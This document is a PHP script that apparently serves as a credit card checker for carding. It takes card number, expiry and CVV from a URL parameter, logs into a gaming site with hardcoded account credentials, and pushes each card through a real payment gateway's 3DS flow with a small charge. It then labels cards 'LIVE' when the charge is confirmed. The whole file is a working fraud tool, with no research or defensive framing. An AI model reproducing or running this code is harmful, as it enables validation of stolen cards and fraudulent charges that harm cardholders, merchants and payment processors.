<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();
 
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://api.melonity.gg/au1h',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/plain, */*',
            'content-type: application/json;charset=UTF-8',
            'origin: https://minority.gg',
            'referer: https://minority.gg/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => '{"login":"zincronyx","password":"hanasakura1","recaptchaToken":null}'
    ));
    $login = curl_exec($ch);
    $accessToken = GetStr($login, '"access_token":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://api.melonity.gg/user/payment/1/USD?pay_method=bank_card',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/plain, */*',
            'authorization: Bearer '.$accessToken,
            'origin: https://minority.gg',
            'referer: https://minority.gg/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        )
    ));
    $selectPaymentMethod = curl_exec($ch);
    $code = ltrim($selectPaymentMethod, "https://securepay.tinkoff.ru/new/");

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://securepay.tinkoff.ru/transactions/'.$code,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: application/json, text/plain, */*',
            'Referer: https://securepay.tinkoff.ru/new/'.$code,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        )
    ));
    $some_things = curl_exec($ch);
    $terminalKey = GetStr($some_things, '"TerminalKey":"', '"');
    $paymentId = GetStr($some_things, '"PaymentId":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://securepay.tinkoff.ru/v2/Check3dsVersion',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/plain, */*',
            'Content-Type: application/json',
            'Origin: https://securepay.tinkoff.ru',
            'Referer: https://securepay.tinkoff.ru/new/'.$code,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => '{"TerminalKey":"'.$terminalKey.'","PaymentId":"'.$paymentId.'","CardData":"PAN='.$cc.';ExpDate='.$mm.''.substr($yy, 2, 4).';CVV='.$cvv.'"}'
    ));
    $check3dsVersion = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://securepay.tinkoff.ru/transactions/'.$code,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/plain, */*',
            'Content-Type: application/json',
            'Origin: https://securepay.tinkoff.ru',
            'Referer: https://securepay.tinkoff.ru/new/'.$code,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => '{"PaymentId":'.$paymentId.',"PaymentData":{"Route":"ACQ","Source":"cards","PAN":"'.$cc.'","ExpDate":"'.$mm.''.substr($yy, 2, 4).'","CVV":"'.$cvv.'"},"TerminalKey":"'.$terminalKey.'","Amount":7425,"DATA":{"timezone":"+480","language":"en-US","os":"Windows","referrer_url":"minority.gg","screen_height":1080,"screen_width":1920,"screenSize":"1920x1080","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36","origin":"web","canvas":"620818261294ad8fd0301e17ce4e1276","screen_dpi":0,"colorDepth":24,"javaEnabled":false},"SendEmail":true,"InfoEmail":"pnrjason@gmail.com"}'
    ));
    $transactions = curl_exec($ch);
    $checkoutUrl = GetStr($transactions, '"Action":"', '"');
    $md = GetStr($transactions, '"MD":"', '"');
    $paramReq = GetStr($transactions, '"PaReq":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $checkoutUrl,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Origin: https://securepay.tinkoff.ru',
            'Referer: https://securepay.tinkoff.ru/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "MD=$md&PaReq=".urlencode($paramReq)."&TermUrl=https%3A%2F%2Fsecurepay.tinkoff.ru%2Ftransactions%2FSubmit3DSAuthorization"
    ));
    $visaGold = curl_exec($ch);
    $paRes = GetStr($visaGold, '<input type="hidden" name="PaRes" value="', '"');
    $paResMd = GetStr($visaGold, '<input type="hidden" name="MD" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://securepay.tinkoff.ru/transactions/Submit3DSAuthorization",
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Origin: https://securepay.tinkoff.ru',
            'Referer: https://securepay.tinkoff.ru/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "PaRes=".urlencode($paRes)."&MD=$paResMd"
    ));
    $visaGold = curl_exec($ch);
    $paRes = GetStr($visaGold, '<input type="hidden" name="PaRes" value="', '"');
    $paResMd = GetStr($visaGold, '<input type="hidden" name="MD" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://securepay.tinkoff.ru/transactions/".$code,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://securepay.tinkoff.ru/transactions/Submit3DSAuthorization'
        )
    ));
    $execute = curl_exec($ch);
    curl_close($ch);

    $status = GetStr($execute, '"Status":"', '"');
    $dcode = GetStr($execute, '"SessionErrorCode":"', '"');
    $respo = GetStr($execute, '"SessionErrorDetails":"', '"');

    if (strpos($execute, 'CONFIRMED')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged $1</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$dcode.': '.$status.' '.$respo.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
    }
    unlink("cookies/$cookie.txt");
?>
